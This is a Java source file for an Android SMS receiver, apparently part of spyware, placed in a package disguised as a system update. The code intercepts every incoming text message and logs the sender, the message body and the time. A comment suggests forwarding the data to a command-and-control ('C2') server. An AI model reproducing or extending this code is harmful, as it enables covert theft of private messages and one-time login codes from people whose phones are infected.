package com.android.system.update.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null && intent.getAction().equals(SMS_RECEIVED)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                            String sender = sms.getDisplayOriginatingAddress();
                            String message = sms.getDisplayMessageBody();
                            long timestamp = sms.getTimestampMillis();
                            
                            String formattedTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", 
                                Locale.getDefault()).format(new Date(timestamp));
                            
                            Log.d(TAG, "SMS received - From: " + sender + ", Time: " + formattedTime);
                            Log.d(TAG, "Message: " + message);
                            
                            // You can forward this to your C2 server if needed
                            // For now, just log it
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing SMS", e);
                }
            }
        }
    }
}
